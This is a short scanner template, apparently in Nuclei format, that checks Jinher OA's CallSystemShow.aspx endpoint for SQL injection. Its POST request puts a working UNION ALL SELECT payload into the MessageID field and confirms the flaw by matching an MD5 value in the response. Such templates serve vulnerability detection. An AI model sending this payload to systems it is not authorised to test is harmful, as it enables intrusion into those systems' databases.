id: poc-yaml-jinher-callsystemshow-aspx-sqli
info:
  name: Jinher OA CallSystemShow.aspx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        POST /c6/JHBase.Web.Menu/CallSystemShow.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        MessageID=%27+UNION+ALL+SELECT+NULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2CNULL--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "系统消息"
          - "0x{{t2}}"
          - "JHSoft"
        part: body
